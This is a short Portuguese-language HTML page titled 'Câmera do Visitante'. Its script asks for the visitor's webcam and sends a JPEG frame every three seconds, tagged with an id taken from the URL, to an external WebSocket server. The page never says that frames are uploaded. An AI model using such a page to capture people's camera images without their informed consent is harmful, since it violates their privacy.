<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <title>Câmera do Visitante</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: sans-serif; text-align: center; padding: 24px }
    #video { width: 100%; max-width: 320px; border: 2px solid #444 }
    #status { margin-top: 16px; color: #555 }
  </style>
</head>
<body>
  <h2>🧑‍💻 Câmera do Visitante</h2>
  <video id="video" autoplay></video>
  <p id="status">Aguardando...</p>

  <script>
    const id = new URLSearchParams(window.location.search).get("id");
    const statusEl = document.getElementById("status");

    const video = document.getElementById("video");
    const canvas = document.createElement("canvas");

    const socket = new WebSocket("wss://lemur-websocket.onrender.com");

    socket.onopen = () => {
      statusEl.textContent = `🔗 Conectado como visitante: ${id}`;

      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          setInterval(() => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext("2d").drawImage(video, 0, 0);
            const imgBase64 = canvas.toDataURL("image/jpeg");

            socket.send(JSON.stringify({
              tipo: "camera",
              id,
              conteudo: imgBase64
            }));
          }, 3000); // Envia uma imagem a cada 3 segundos
        })
        .catch(() => {
          statusEl.textContent = "❌ Não foi possível acessar a câmera.";
        });
    };
  </script>
</body>
</html>
